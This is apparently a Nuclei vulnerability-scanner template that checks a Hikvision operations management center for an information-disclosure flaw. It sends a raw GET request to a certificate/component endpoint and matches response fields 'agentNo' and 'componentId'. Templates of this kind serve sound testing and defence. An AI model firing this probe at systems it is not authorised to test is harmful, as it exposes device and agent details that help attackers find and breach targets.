id: hikvision-component-info

info:
  name: hikvision-component-info
  author: HB
  severity: high
  description: 海康威视运行管理中心component存在信息泄露

http:
  - raw:
    - |
      GET /bic/caService/v1/certificate/machine/component HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"agentNo") && contains_all(body,"componentId")'